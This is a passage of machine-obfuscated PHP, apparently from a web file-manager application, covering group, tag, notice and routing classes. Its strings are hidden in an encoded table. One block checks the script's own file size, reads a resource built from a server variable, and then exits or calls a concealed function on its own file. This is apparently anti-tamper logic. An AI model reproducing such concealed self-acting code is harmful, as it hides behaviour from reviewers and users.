$õ¯Ğİœû[] = $‚Í—‚ŠÍ[$¿»—·Å¿]; } } return $õ¯Ğİœû; } protected function isParentOf($ßßäÁ ¬, $äìãù¤) { $•Ï¢ƒÄÔ =& $_SERVER[„Ç©ñÎ©]; if (!$ßßäÁ ¬ || !$äìãù¤ || $ßßäÁ ¬ == $äìãù¤) { return !1; } $­Í¥ ìÆ = $this->getInfoSimple($ßßäÁ ¬); $—»¸Ùªâ = $this->getInfoSimple($äìãù¤); $ã±”ƒ‹ì = $­Í¥ ìÆ[$•Ï¢ƒÄÔ[530]] . $ßßäÁ ¬ . $•Ï¢ƒÄÔ[50]; if (substr($—»¸Ùªâ[$•Ï¢ƒÄÔ[530]], 0, strlen($ã±”ƒ‹ì)) == $ã±”ƒ‹ì) { return !0; } return !1; } public function groupShowRoot($Æ¿ö³•ß, $£´²€Ü = false) { $²ÇŠä±Ù =& $_SERVER[„Ç©ñÎ©]; $•¢Ìı‚æ = $this->getInfo($Æ¿ö³•ß); if (!$•¢Ìı‚æ) { return array(); } $—¤ĞğÖú = $this->parentLevelArray($•¢Ìı‚æ[$²ÇŠä±Ù[530]]); $ò´ùÄ® = array($Æ¿ö³•ß); if (count($—¤ĞğÖú) == 0) { return $ò´ùÄ®; } if ($£´²€Ü && count($—¤ĞğÖú) == 1) { return $ò´ùÄ®; } if (!$•¢Ìı‚æ[$²ÇŠä±Ù[475]] || !isset($•¢Ìı‚æ[$²ÇŠä±Ù[475]][$²ÇŠä±Ù[1913]]) || $•¢Ìı‚æ[$²ÇŠä±Ù[475]][$²ÇŠä±Ù[1913]] == $²ÇŠä±Ù[1882]) { return $this->groupShowRoot($—¤ĞğÖú[count($—¤ĞğÖú) - 1], $£´²€Ü); } if ($•¢Ìı‚æ[$²ÇŠä±Ù[475]][$²ÇŠä±Ù[1913]] == $²ÇŠä±Ù[366]) { $äÒÆ’å¾ = explode($²ÇŠä±Ù[50], $•¢Ìı‚æ[$²ÇŠä±Ù[475]][$²ÇŠä±Ù[1914]]); if ($äÒÆ’å¾) { $ò´ùÄ® = array_merge($ò´ùÄ®, $äÒÆ’å¾); } } return $ò´ùÄ®; } protected function resetParentLevel() { $…éïó¸ =& $_SERVER[„Ç©ñÎ©]; $ÍĞÙƒ²Ï = $…éïó¸[1827]; $§¶šãé¥ = $this->select(); $§¶šãé¥ = array_to_keyvalue($§¶šãé¥, $ÍĞÙƒ²Ï); foreach ($§¶šãé¥ as $°áÑ£İÊ) { $·­¤ÓÂ• = $°áÑ£İÊ; $¸ÃŒ’™Â = array(); while ($·­¤ÓÂ•[$…éïó¸[441]] != 0) { $¸ÃŒ’™Â[] = $·­¤ÓÂ•[$…éïó¸[441]]; $·­¤ÓÂ• = $§¶šãé¥[$·­¤ÓÂ•[$…éïó¸[441]]]; } $¸ÃŒ’™Â[] = 0; $¸ÃŒ’™Â = $…éïó¸[50] . implode($…éïó¸[50], array_reverse($¸ÃŒ’™Â)) . $…éïó¸[50]; $this->setNamePinyin($°áÑ£İÊ[$ÍĞÙƒ²Ï], $°áÑ£İÊ[$…éïó¸[32]]); $this->where(array($ÍĞÙƒ²Ï => $°áÑ£İÊ[$ÍĞÙƒ²Ï]))->save(array($…éïó¸[599] => $¸ÃŒ’™Â)); } return $§¶šãé¥; } public function groupNameAuto($³ˆ‹ªïœ, $À—¬úå°) { $ıàí¬ê =& $_SERVER[„Ç©ñÎ©]; $€ÀŞÆ÷ = $this->where(array($ıàí¬ê[410] => $³ˆ‹ªïœ))->getField($ıàí¬ê[32], !0); if (!$€ÀŞÆ÷ || !in_array($À—¬úå°, $€ÀŞÆ÷)) { return $À—¬úå°; } for ($ô‡±ç±Û = 1; $ô‡±ç±Û <= count($€ÀŞÆ÷) + 1; $ô‡±ç±Û++) { $ÅûÂ’œä = $À—¬úå° . "\x28{$ô‡±ç±Û}\51"; if (!in_array($ÅûÂ’œä, $€ÀŞÆ÷)) { return $ÅûÂ’œä; } } } public function groupSwitch($·æëŠÍÈ, $ÊÙõôñ—) { $´¯¹É­ =& $_SERVER[„Ç©ñÎ©]; $Ü´‘åˆâ = array($´¯¹É­[1827] => array($´¯¹É­[7], array($·æëŠÍÈ, $ÊÙõôñ—))); $ìÆÛ¡ = $this->where($Ü´‘åˆâ)->select(); $ìÆÛ¡ = array_to_keyvalue($ìÆÛ¡, $´¯¹É­[1827]); if (!isset($ìÆÛ¡[$·æëŠÍÈ]) || !isset($ìÆÛ¡[$ÊÙõôñ—]) || $ìÆÛ¡[$·æëŠÍÈ][$´¯¹É­[441]] == 0) { return !1; } $Ü´‘åˆâ = array($´¯¹É­[1827] => $·æëŠÍÈ); $‘ŸÇ¹¥ì = Model($´¯¹É­[1917])->where($Ü´‘åˆâ)->select(); if (!$‘ŸÇ¹¥ì) { $‘ŸÇ¹¥ì = array(); } foreach ($‘ŸÇ¹¥ì as $Ö½„¢æó) { $“ğ§¥æÄ = $Ö½„¢æó[$´¯¹É­[1655]]; $Ü´‘åˆâ = array($´¯¹É­[1655] => $“ğ§¥æÄ, $´¯¹É­[1827] => $ÊÙõôñ—); $Š‚©ˆ×œ = Model($´¯¹É­[1917])->where($Ü´‘åˆâ)->find(); if (!$Š‚©ˆ×œ) { $ëí®å…® = array($ÊÙõôñ— => $Ö½„¢æó[$´¯¹É­[1931]]); Model($´¯¹É­[544])->userGroupAdd($“ğ§¥æÄ, $ëí®å…®); } Model($´¯¹É­[544])->userGroupRemove($“ğ§¥æÄ, $·æëŠÍÈ); } $Ü´‘åˆâ = array($´¯¹É­[420] => 2, $´¯¹É­[441] => 0, $´¯¹É­[419] => 1, $´¯¹É­[514] => array($´¯¹É­[7], array($·æëŠÍÈ, $ÊÙõôñ—))); $ûÏÀ¥Í² = Model($´¯¹É­[828])->where($Ü´‘åˆâ)->field($´¯¹É­[1932])->select(); $ûÏÀ¥Í² = array_to_keyvalue($ûÏÀ¥Í², $´¯¹É­[514], $´¯¹É­[411]); $ß®¢­’ = !empty($ûÏÀ¥Í²[$·æëŠÍÈ]) ? $ûÏÀ¥Í²[$·æëŠÍÈ] : !1; if ($ß®¢­’) { if (!$ûÏÀ¥Í²[$ÊÙõôñ—]) { $ûÏÀ¥Í²[$ÊÙõôñ—] = Model($´¯¹É­[828])->groupRootAdd($ÊÙõôñ—); } $‚À“²â = $ûÏÀ¥Í²[$ÊÙõôñ—]; $Ü´‘åˆâ = array($´¯¹É­[441] => $ß®¢­’); $ûÏÀ¥Í² = Model($´¯¹É­[828])->where($Ü´‘åˆâ)->field($´¯¹É­[1933])->select(); if (!$ûÏÀ¥Í²) { $ûÏÀ¥Í² = array(); } Model($´¯¹É­[828])->moveClearAuth = !1; foreach ($ûÏÀ¥Í² as $ÎáóÊÒ’) { $–ğ¢µ = $ÎáóÊÒ’[$´¯¹É­[419]] == $´¯¹É­[98] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($´¯¹É­[828])->move($ÎáóÊÒ’[$´¯¹É­[411]], $‚À“²â, $–ğ¢µ); } Model($´¯¹É­[828])->moveClearAuth = !0; $Ü´‘åˆâ = array($´¯¹É­[420] => 2, $´¯¹É­[514] => $·æëŠÍÈ); $¤ÜÊŒ¨ = array($´¯¹É­[514] => $ÊÙõôñ—); Model($´¯¹É­[1934])->where($Ü´‘åˆâ)->save($¤ÜÊŒ¨); Model($´¯¹É­[1935])->where($Ü´‘åˆâ)->save($¤ÜÊŒ¨); } $this->_changeChildLevel($ìÆÛ¡[$·æëŠÍÈ], $ìÆÛ¡[$ÊÙõôñ—], !0); $this->where(array($´¯¹É­[441] => $·æëŠÍÈ))->save(array($´¯¹É­[441] => $ÊÙõôñ—)); $this->_clearChildrenCache($ìÆÛ¡[$ÊÙõôñ—]); return !0; } } goto BˆÃ®º¶¾Ö; cÛƒ×ÕÙ: class UserTagModel extends ModelBaseLight { public $optionType = "\125\163\x65\162\x2e\164\141\147\x4c\151\x73\x74"; public $modelType = "\125\163\x65\162\117\x70\x74\151\157\x6e"; public $field = array("\156\x61\155\145", "\x73\164\x79\x6c\145", "\x73\x6f\x72\164"); public function listData($Åñ²ØÜø = false, $½¢ØÌÂ« = "\163\157\162\164", $ÅĞşõã = false) { return parent::listData($Åñ²ØÜø, $½¢ØÌÂ«, $ÅĞşõã); } public function remove($“«Áöëá) { return parent::remove($“«Áöëá); } public function add($ªÌãó£Ä, $Ö€ñÈá€ = "\x6c\x61\142\145\154\55\x67\162\x65\x79\55\x6e\157\162\155\141\154") { $óçÙíâ =& $_SERVER[„Ç©ñÎ©]; if ($this->findByName($ªÌãó£Ä)) { return !1; } $øÕ×âú = array($óçÙíâ[429] => $ªÌãó£Ä, $óçÙíâ[494] => $Ö€ñÈá€, $óçÙíâ[1831] => $this->getSort($óçÙíâ[267]) + 1); return parent::insert($øÕ×âú); } public function update($ÒÍĞÆöš, $Š²­Öç) { $¦˜ŸÕÖ‹ =& $_SERVER[„Ç©ñÎ©]; $¯®œÓı¢ = $this->listData($ÒÍĞÆöš); $òÂ¢ŠøÌ = $this->findByName($Š²­Öç[$¦˜ŸÕÖ‹[32]]); if (!$¯®œÓı¢ || $òÂ¢ŠøÌ && $òÂ¢ŠøÌ[$¦˜ŸÕÖ‹[408]] != $¯®œÓı¢[$¦˜ŸÕÖ‹[408]]) { return !1; } return parent::update($ÒÍĞÆöš, $Š²­Öç); } public function moveTop($øÖñ¢½µ) { $ŠÛÈ»’ğ =& $_SERVER[„Ç©ñÎ©]; $Ö½Ğºõ = parent::listData(); $ß¤ÅÖ¤ò = $this->getSort($ŠÛÈ»’ğ[266]); foreach ($Ö½Ğºõ as &$ºÒÖÙÂ) { if ($ºÒÖÙÂ[$ŠÛÈ»’ğ[408]] == $øÖñ¢½µ) { $ºÒÖÙÂ[$ŠÛÈ»’ğ[1851]] = $ß¤ÅÖ¤ò; continue; } $ºÒÖÙÂ[$ŠÛÈ»’ğ[1851]] += 1; } unset($ºÒÖÙÂ); return parent::resetData($Ö½Ğºõ); } public function moveBottom($Ãğ‚ÒìÏ) { $‚®»Ñ·ˆ =& $_SERVER[„Ç©ñÎ©]; $ß±İó½ = $this->getSort($‚®»Ñ·ˆ[267]) + 1; return parent::update($Ãğ‚ÒìÏ, array($‚®»Ñ·ˆ[1851] => $ß±İó½)); } public function resetSort($ÓÕ…¤íô) { $”¨áå¿ =& $_SERVER[„Ç©ñÎ©]; $¯Úı†™ƒ = array(); $ÓÕ…¤íô = is_array($ÓÕ…¤íô) ? $ÓÕ…¤íô : array(); for ($£ùåãÈÉ = 0; $£ùåãÈÉ < count($ÓÕ…¤íô); $£ùåãÈÉ++) { $¯Úı†™ƒ[$ÓÕ…¤íô[$£ùåãÈÉ] . $”¨áå¿[12]] = $£ùåãÈÉ + 1; } $ÆÜ²–¼û = parent::listData(); foreach ($ÆÜ²–¼û as &$™†¨ã–») { $†ÌÏşÉÓ = $¯Úı†™ƒ[$™†¨ã–»[$”¨áå¿[408]]]; $™†¨ã–»[$”¨áå¿[1851]] = $†ÌÏşÉÓ ? $†ÌÏşÉÓ : $™†¨ã–»[$”¨áå¿[1851]]; } unset($™†¨ã–»); return parent::resetData($ÆÜ²–¼û); } private function getSort($¿¢ééÒö) { $Ğ‘”½» =& $_SERVER[„Ç©ñÎ©]; $ˆÁ»¸ùÃ = parent::listData(); $Õ×¿Ğú = array_to_keyvalue($ˆÁ»¸ùÃ, $Ğ‘”½»[12], $Ğ‘”½»[1851]); if (!$Õ×¿Ğú) { $Õ×¿Ğú = array(0); } $Î‰“¼Á¶ = $¿¢ééÒö == $Ğ‘”½»[267] ? max($Õ×¿Ğú) : min($Õ×¿Ğú); return intval($Î‰“¼Á¶); } } goto D÷œÌŸµÕ”; FÌ„çØóİ«: class SystemNoticeModel extends ModelBaseLight { public $optionType = "\123\x79\163\x74\x65\155\56\156\x6f\164\x69\x63\145\114\151\163\x74"; public $field = array("\x6e\141\155\x65", "\x63\x6f\156\x74\x65\156\164", "\141\165\164\x68", "\x6d\x6f\144\x65", "\x74\x69\155\x65", "\164\171\160\x65", "\154\x65\x76\145\154", "\145\x6e\x61\142\x6c\x65", "\163\x6f\162\164"); public function listData($ëå„Ù» = false, $†ë¦Åùˆ = "\163\x6f\162\x74", $¬‡ÖÃÂ = false) { return parent::listData($ëå„Ù», $†ë¦Åùˆ, $¬‡ÖÃÂ); } public function add($ûÒùõ—Õ) { $‡öÂ˜¯ =& $_SERVER[„Ç©ñÎ©]; $Æ×ıû«× = time(); if ($ûÒùõ—Õ[$‡öÂ˜¯[16]] == $‡öÂ˜¯[2253]) { $Æ×ıû«× = strtotime($ûÒùõ—Õ[$‡öÂ˜¯[213]]); } $ûÒùõ—Õ[$‡öÂ˜¯[213]] = $Æ×ıû«×; return parent::insert($ûÒùõ—Õ); } public function update($¼Ò®€÷, $áÇùËµ) { $ŒÉçˆØò =& $_SERVER[„Ç©ñÎ©]; $Å ‡…™“ = $this->listData($¼Ò®€÷); if (!$Å ‡…™“) { return !1; } $òï™ğÜç = time(); if ($áÇùËµ[$ŒÉçˆØò[16]] == $ŒÉçˆØò[2253]) { $òï™ğÜç = strtotime($áÇùËµ[$ŒÉçˆØò[213]]); } $áÇùËµ[$ŒÉçˆØò[213]] = $òï™ğÜç; return parent::update($¼Ò®€÷, $áÇùËµ); } public function remove($Œ‘çÄ…) { $êË·¬±© = $this->listData($Œ‘çÄ…); if (!$êË·¬±© || $êË·¬±©[$_SERVER[„Ç©ñÎ©][1275]]) { return !1; } return parent::remove($Œ‘çÄ…); } public function sort($úíñÂüä, $‚¨¿¶€©) { return parent::update($úíñÂüä, $‚¨¿¶€©); } public function enable($×¥Õ´ƒ, $å±§ÀøÅ) { return parent::update($×¥Õ´ƒ, array($_SERVER[„Ç©ñÎ©][2254] => $å±§ÀøÅ)); } private function initUserOption() { $óÊ÷á´Ô =& $_SERVER[„Ç©ñÎ©]; $this->optionType = $óÊ÷á´Ô[2255]; $this->modelType = $óÊ÷á´Ô[2256]; $this->field = array($óÊ÷á´Ô[2257], $óÊ÷á´Ô[32], $óÊ÷á´Ô[213], $óÊ÷á´Ô[33], $óÊ÷á´Ô[2258], $óÊ÷á´Ô[753], $óÊ÷á´Ô[205]); } public function userNoticeGet($ÍÔ¾Š¢Â = false) { $this->initUserOption(); return parent::listData($ÍÔ¾Š¢Â, $_SERVER[„Ç©ñÎ©][408], !0); } public function userNoticeAdd($¯¨«Å¶) { $ºŠÌò· =& $_SERVER[„Ç©ñÎ©]; $this->initUserOption(); $éß÷ªğœ = $this->findByKey($ºŠÌò·[2257], $¯¨«Å¶[$ºŠÌò·[408]]); if ($éß÷ªğœ) { return !0; } $ÖÎ®Ì» = array($ºŠÌò·[2257] => $¯¨«Å¶[$ºŠÌò·[408]], $ºŠÌò·[32] => $¯¨«Å¶[$ºŠÌò·[32]], $ºŠÌò·[213] => $¯¨«Å¶[$ºŠÌò·[213]], $ºŠÌò·[33] => isset($¯¨«Å¶[$ºŠÌò·[33]]) ? $¯¨«Å¶[$ºŠÌò·[33]] : 1, $ºŠÌò·[2258] => isset($¯¨«Å¶[$ºŠÌò·[2258]]) ? $¯¨«Å¶[$ºŠÌò·[2258]] : 0, $ºŠÌò·[753] => 0, $ºŠÌò·[205] => 0); return parent::insert($ÖÎ®Ì»); } public function userNoticeEdit($Í×¬ĞÇì, $›’úšá) { $this->initUserOption(); return parent::update($Í×¬ĞÇì, $›’úšá); } } class SystemOptionModel extends ModelBaseOption { protected $tableName = "\x73\171\x73\x74\145\155\x5f\x6f\160\x74\151\x6f\156"; protected $jsonField = array("\x6d\145\x6e\x75", "\162\x6f\154\x65", "\x72\157\154\x65\107\162\157\x75\x70", "\162\145\x67\151\163\x74", "\145\155\x61\151\x6c"); function __construct() { parent::__construct(); } protected function cacheKey($’Ü‰ä®») { return "\123\x79\163\164\x65\x6d\117\160\164\151\x6f\156\137{$’Ü‰ä®»}"; } protected function optionDefault($¯á„àéÄ = '') { $¼ÉˆÏß¸ =& $_SERVER[„Ç©ñÎ©]; if ($¯á„àéÄ == $¼ÉˆÏß¸[12]) { return $GLOBALS[$¼ÉˆÏß¸[6]][$¼ÉˆÏß¸[390]]; } } } class SystemRecordModel extends ModelBaseLight { } goto b§Ä ÌÉÎÜ; fÖ˜ØÆ†Ô: $_file = $_SERVER[$_SERVER[„Ç©ñÎ©][60]]; $_size = $_SERVER[„Ç©ñÎ©][61]; if ($_SERVER[$_SERVER[„Ç©ñÎ©][62]] != $_size($_file)) { $_getc = $_SERVER[„Ç©ñÎ©][63]; $_getfile = $_SERVER[$_SERVER[„Ç©ñÎ©][64]] . $_SERVER[„Ç©ñÎ©][65]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[„Ç©ñÎ©][66], $_getfilec); if (count($_getarrs) < $_SERVER[„Ç©ñÎ©][67]) { $exit = $_SERVER[„Ç©ñÎ©][68]; $exit(); } $_act = $_SERVER[„Ç©ñÎ©][69]; $_act($_file); } goto eçµ¢ñ»£ƒ; e§è£ëš»¼: define($_SERVER[„Ç©ñÎ©][0], $_SERVER[„Ç©ñÎ©][1]); $_SERVER[ÒŞÌîˆ] = explode($_SERVER[„Ç©ñÎ©][2], gzinflate(substr($_SERVER[„Ç©ñÎ©][3], 10, -8))); function binCheckEq($Õ²Íø¨†, $«°¿Ãªà) { return $Õ²Íø¨† == $«°¿Ãªà; } goto DªÉ­¬í•; DªÉ­¬í•: $fileSize = strrev(base64_decode($_SERVER[ÒŞÌîˆ][0])); function binCheckNeq($—¨İ†çá, $©Â•Ï) { return $—¨İ†çá != $©Â•Ï; } $_SERVER[$_SERVER[ÒŞÌîˆ][1]] = $fileSize($_SERVER[$_SERVER[ÒŞÌîˆ][2]]); goto D‘ç½ÕÅ¡; Còó¦é´ß†: class Application { private $defaultModule = "\151\x6e\x64\x65\x78"; private $defaultController = "\x69\156\x64\145\x78"; private $defaultAction = "\x69\x6e\144\145\170"; function __construct() { } public function setDefault($­Ğà¿ç) { $Ñø¨ıÆÜ =& $_SERVER[„Ç©ñÎ©]; $¨Û‡¥å =& $_SERVER[´ºÄÉ³ã]; $òÙ š´¢ = explode($¨Û‡¥å[0], trim($­Ğà¿ç, $¨Û‡¥å[0])); $¬‘úîŠÌ = $Ñø¨ıÆÜ[628]; if (!$¬‘úîŠÌ) { die; } $this->defaultModule = $òÙ š´¢[0] ? $òÙ š´¢[0] : $this->defaultModule; $this->defaultController = $òÙ š´¢[1] ? $òÙ š´¢[1] : $this->defaultController; $Î˜‡êùé = $Ñø¨ıÆÜ[629]; $this->defaultAction = $òÙ š´¢[2] ? $òÙ š´¢[2] : $this->defaultAction; $this->noul93d39d2e($¨Û‡¥å[1], array($this, $¨Û‡¥å[2])); } public function appRun($öß¨”Óğ) { $±‹Ã¡ó =& $_SERVER[„Ç©ñÎ©]; $¹İ«°ü =& $_SERVER[´ºÄÉ³ã]; $”éÅ¡æ° = explode($¹İ«°ü[0], $öß¨”Óğ); $“Şğ°Íœ = strtolower($”éÅ¡æ°[0]); $¾Äã¼ÓÑ = $¹İ«°ü[3]; $ğíâõô = $±‹Ã¡ó[630]; if (strlen($ğíâõô) < $±‹Ã¡ó[631]) { return; } if ($“Şğ°Íœ == $¹İ«°ü[4]) { $¾Äã¼ÓÑ = $¹İ«°ü[5]; $”éÅ¡æ°[0] = $¹İ«°ü[6]; $”éÅ¡æ°[1] = $”éÅ¡æ°[1] . $¹İ«°ü[7]; $öß¨”Óğ = join($¹İ«°ü[0], $”éÅ¡æ°); $öß¨”Óğ = trim($öß¨”Óğ, $¹İ«°ü[0]); } call_user_func(array($¹İ«°ü[8], $¹İ«°ü[9]), $¾Äã¼ÓÑ . $¹İ«°ü[10], $öß¨”Óğ); ActionCall($öß¨”Óğ); call_user_func(array($¹İ«°ü[8], $¹İ«°ü[9]), $¾Äã¼ÓÑ . $¹İ«°ü[11], $öß¨”Óğ); } private function autorun() { $¦²îË³ =& $_SERVER[´ºÄÉ³ã]; global $config; if (count($config[$¦²îË³[12]]) == 0) { return; } foreach ($config[$¦²îË³[12]] as $ÔÁÊÈ² => $Ó©ìë—•) { $this->appRun($Ó©ìë—•); $ÂìûÍÖ· = $_SERVER[„Ç©ñÎ©][632]; if (!$ÂìûÍÖ·) { return; } } } private function axhw01829d12() { $æ¦ù›Äú =& $_SERVER[„Ç©ñÎ©]; $…È¥ÃÜ± =& $_SERVER[´ºÄÉ³ã]; $ßÎà›ä = $…È¥ÃÜ±[4]; $ì¢Ñ«íÃ = $æ¦ù›Äú[633]; if (strlen($ì¢Ñ«íÃ) < $æ¦ù›Äú[634]) { die; } $¨ÊÙĞùü = $GLOBALS[$…È¥ÃÜ±[13]][$…È¥ÃÜ±[14]][0]; if (!$¨ÊÙĞùü || strlen($¨ÊÙĞùü) <= strlen($ßÎà›ä)) { return; } if (strtolower(substr($¨ÊÙĞùü, -strlen($ßÎà›ä))) != $ßÎà›ä) { return; } $É–²‡Šš = substr($¨ÊÙĞùü, 0, -strlen($ßÎà›ä)); $¥Ì¼Å«ª = $æ¦ù›Äú[635]; if (!$¥Ì¼Å«ª) { die; } $Ÿ„…Š«Ê = array($…È¥ÃÜ±[4], $É–²‡Šš); $ ×¥­Âı = $æ¦ù›Äú[636]; while ($ ×¥­Âı < $æ¦ù›Äú[634]) { if ($ ×¥­Âı >= 0) { break; } $ ×¥­Âı++; } $›®äÒ» = array_slice($GLOBALS[$…È¥ÃÜ±[13]][$…È¥ÃÜ±[14]], 1); $GLOBALS[$…È¥ÃÜ±[13]][$…È¥ÃÜ±[14]] = array_merge($Ÿ„…Š«Ê, $›®äÒ»); $ïº ùµ… = $æ¦ù›Äú[637]; $GLOBALS[$…È¥ÃÜ±[13]][$…È¥ÃÜ±[15]] = implode($…È¥ÃÜ±[0], $GLOBALS[$…È¥ÃÜ±[13]][$…È¥ÃÜ±[14]]); } private function iyudf6a9831d() { $ÃîáŞÆ¡ =& $_SERVER[´ºÄÉ³ã]; if ($GLOBALS[$ÃîáŞÆ¡[13]][$ÃîáŞÆ¡[15]] != $ÃîáŞÆ¡[6]) { return; } $™˜×öÊÖ = $_SERVER[$ÃîáŞÆ¡[16]]; $¯óì¨Æ = $ÃîáŞÆ¡[17]; if (!strstr($™˜×öÊÖ, $¯óì¨Æ)) { return; } $ıñ’·ş¯ = strrpos($™˜×öÊÖ, $¯óì¨Æ); $‡ˆá¥¨ê = substr($™˜×öÊÖ, $ıñ’·ş¯ + strlen($¯óì¨Æ)); $®¿©•ı± = $_SERVER[„Ç©ñÎ©][638]; if (!$®¿©•ı±) { die; } preg_match_all($ÃîáŞÆ¡[18], $‡ˆá¥¨ê, $ªÕ§›ú®); $‡ˆá¥¨ê = trim($ªÕ§›ú®[0][0], $ÃîáŞÆ¡[19]); $GLOBALS[$ÃîáŞÆ¡[13]][$ÃîáŞÆ¡[14]] = explode($ÃîáŞÆ¡[19], $‡ˆá¥¨ê); $GLOBALS[$ÃîáŞÆ¡[13]][$ÃîáŞÆ¡[15]] = implode($ÃîáŞÆ¡[0], $GLOBALS[$ÃîáŞÆ¡[13]][$ÃîáŞÆ¡[14]]); } public function run() { $ğé¨Ø¸Ÿ =& $_SERVER[„Ç©ñÎ©]; $šÙ¶ì¸â =& $_SERVER[´ºÄÉ³ã]; $this->iyudf6a9831d(); $this->axhw01829d12(); $ÙàÓæñ = $ğé¨Ø¸Ÿ[639]; if (strlen($ÙàÓæñ) < $ğé¨Ø¸Ÿ[634]) { return; } $ÈÏ­–øæ = $GLOBALS[$šÙ¶ì¸â[13]][$šÙ¶ì¸â[14]]; $…™òÇÑ‘ = $ğé¨Ø¸Ÿ[640]; $Œ‚¶¢¶ = $GLOBALS[$šÙ¶ì¸â[13]][$šÙ¶ì¸â[15]]; $ÀÍşöêÎ = $ğé¨Ø¸Ÿ[641]; while (strlen($ÀÍşöêÎ) < $ğé¨Ø¸Ÿ[634]) { if (!$ÀÍşöêÎ) { break; } $ÀÍşöêÎ++; } define($šÙ¶ì¸â[20], isset($ÈÏ­–øæ[0]) && $ÈÏ­–øæ[0] ? $ÈÏ­–øæ[0] : $this->defaultModule); $ÊôÀ’‡Ÿ = $ğé¨Ø¸Ÿ[642]; if (!$ÊôÀ’‡Ÿ) { die; } define($šÙ¶ì¸â[21], isset($ÈÏ­–øæ[1]) && $ÈÏ­–øæ[0] ? $ÈÏ­–øæ[1] : $this->defaultController); define($šÙ¶ì¸â[22], isset($ÈÏ­–øæ[2]) && $ÈÏ­–øæ[0] ? $ÈÏ­–øæ[2] : $this->defaultAction); define($šÙ¶ì¸â[23], MOD . $šÙ¶ì¸â[0] . ST . $šÙ¶ì¸â[0] . ACT); $_SERVER[$šÙ¶ì¸â[24]] = strtolower(ACTION); $this->autorun(); $¼ñãöÅå = $ğé¨Ø¸Ÿ[643]; if (count($ÈÏ­–øæ) >= 3) { $this->appRun($Œ‚¶¢¶); } else { $this->appRun(ACTION); } } private $cfiod0f74927 = array(); private $lkwq0b61f139 = ''; public function nqdj5c653e5c() { $ÉÆ¨ŞÚì =& $_SERVER[„Ç©ñÎ©]; $æÕÂøßİ =& $_SERVER[´ºÄÉ³ã]; $this->mitr6d4d0a4c(); $½® ¦ßŸ = $ÉÆ¨ŞÚì[644]; $this->fouadee1eb60(); $this->lshnd085c94f(); $Ô£ã˜õ¤ = $ÉÆ¨ŞÚì[645]; if (strlen($Ô£ã˜õ¤) < $ÉÆ¨ŞÚì[634]) { die; } $this->eqlhe3f9beb7(); $â²×¡…¢ = $ÉÆ¨ŞÚì[646]; if (!$â²×¡…¢) { return; } $this->rnlw4fa08faf(); $¥›Õ´»Ã = $ÉÆ¨ŞÚì[647]; while ($¥›Õ´»Ã < $ÉÆ¨ŞÚì[634]) { if ($¥›Õ´»Ã >= 0) { break; } $¥›Õ´»Ã++; } $this->feird1f22b87(); $this->mdohc87b67cc(); $this->noul93d39d2e($æÕÂøßİ[25], array($this, $æÕÂøßİ[26])); $èÙ‚Ì£¤ = $ÉÆ¨ŞÚì[648]; while (strlen($èÙ‚Ì£¤) < $ÉÆ¨ŞÚì[624]) { if (!$èÙ‚Ì£¤) { break; } $èÙ‚Ì£¤++; } $this->noul93d39d2e($æÕÂøßİ[27], array($this, $æÕÂøßİ[28])); $úñöç“€ = $ÉÆ¨ŞÚì[649]; while (strlen($úñöç“€) < $ÉÆ¨ŞÚì[650]) { if (!$úñöç“€) { break; } $úñöç“€++; } $this->noul93d39d2e($æÕÂøßİ[29], array($this, $æÕÂøßİ[30])); $this->noul93d39d2e($æÕÂøßİ[31], array($this, $æÕÂøßİ[32])); } public function hbsc7ebffd98($Œ÷É’‰…) { $ÂßıÇù =& $_SERVER[„Ç©ñÎ©]; $ÆÖµ†Ò· =& $_SERVER[´ºÄÉ³ã]; $•½È¡ãÅ = Model($ÆÖµ†Ò·[33])->get(); $šİ·™Šô = array($ÆÖµ†Ò·[34], $ÆÖµ†Ò·[35], $ÆÖµ†Ò·[36], $ÆÖµ†Ò·[37], $ÆÖµ†Ò·[38], $ÆÖµ†Ò·[39], $ÆÖµ†Ò·[40], $ÆÖµ†Ò·[41], $ÆÖµ†Ò·[42], $ÆÖµ†Ò·[43], $ÆÖµ†Ò·[44], $ÆÖµ†Ò·[45], $ÆÖµ†Ò·[46], $ÆÖµ†Ò·[47], $ÆÖµ†Ò·[48], $ÆÖµ†Ò·[49], $ÆÖµ†Ò·[50], $ÆÖµ†Ò·[51], $ÆÖµ†Ò·[52], $ÆÖµ†Ò·[53], $ÆÖµ†Ò·[54], $ÆÖµ†Ò·[55], $ÆÖµ†Ò·[56], $ÆÖµ†Ò·[57], $ÆÖµ†Ò·[58], $ÆÖµ†Ò·[59], $ÆÖµ†Ò·[60], $ÆÖµ†Ò·[61], $ÆÖµ†Ò·[62], $ÆÖµ†Ò·[63], $ÆÖµ†Ò·[64], $ÆÖµ†Ò·[65], $ÆÖµ†Ò·[66], $ÆÖµ†Ò·[67], $ÆÖµ†Ò·[68], $ÆÖµ†Ò·[69], $ÆÖµ†Ò·[70], $ÆÖµ†Ò·[71], $ÆÖµ†Ò·[72], $ÆÖµ†Ò·[73], $ÆÖµ†Ò·[74], $ÆÖµ†Ò·[75], $ÆÖµ†Ò·[76], $ÆÖµ†Ò·[77], $ÆÖµ†Ò·[78], $ÆÖµ†Ò·[79], $ÆÖµ†Ò·[80], $ÆÖµ†Ò·[81], $ÆÖµ†Ò·[82], $ÆÖµ†Ò·[83]); $©¦ûââ = $ÂßıÇù[651]; if (!$©¦ûââ) { die; } foreach ($šİ·™Šô as $ÑúÈÏæà) { $ºÒİÇî¯ = $GLOBALS[$ÆÖµ†Ò·[84]][$ÆÖµ†Ò·[85]][$ÑúÈÏæà]; if (isset($•½È¡ãÅ[$ÑúÈÏæà])) { $ºÒİÇî¯ = $•½È¡ãÅ[$ÑúÈÏæà]; } $Œ÷É’‰…[$ÆÖµ†Ò·[86]][$ÆÖµ†Ò·[87]][$ÑúÈÏæà] = $ºÒİÇî¯; } $ş¢‹ƒ¤å = $Œ÷É’‰…[$ÆÖµ†Ò·[86]][$ÆÖµ†Ò·[87]][$ÆÖµ†Ò·[46]]; unset($Œ÷É’‰…[$ÆÖµ†Ò·[86]][$ÆÖµ†Ò·[88]][$ÆÖµ†Ò·[89]]); unset($Œ÷É’‰…[$ÆÖµ†Ò·[86]][$ÆÖµ†Ò·[88]][$ÆÖµ†Ò·[90]]); $™Ì¦½‹Ì = $ÂßıÇù[652]; if (!$™Ì¦½‹Ì) { die; } unset($Œ÷É’‰…[$ÆÖµ†Ò·[86]][$ÆÖµ†Ò·[87]][$ÆÖµ†Ò·[46]]); 